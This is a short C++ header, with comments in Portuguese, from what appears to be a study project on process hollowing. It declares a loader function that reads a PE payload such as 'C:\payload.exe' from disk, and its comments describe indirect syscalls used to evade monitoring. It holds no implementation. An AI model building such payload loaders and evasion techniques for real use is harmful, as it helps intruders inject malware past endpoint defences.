#pragma once
#include "Common.h"

namespace Hollowing {

    // "Network" mantido por compatibilidade de nome. Na pratica, agora
    // carrega o PE de um arquivo local via NtCreateFile + NtReadFile
    // (indirect syscalls). Nao ha HTTP/WinINet - toda a stack de rede
    // envolveria implementar TCP sobre \Device\Afd, fora do escopo do
    // estudo.
    class Network {
    public:
        // path: caminho Windows normal, ex: "C:\\payload.exe"
        static bool DownloadPE(const std::string& path, std::vector<BYTE>& outData);
    };
}
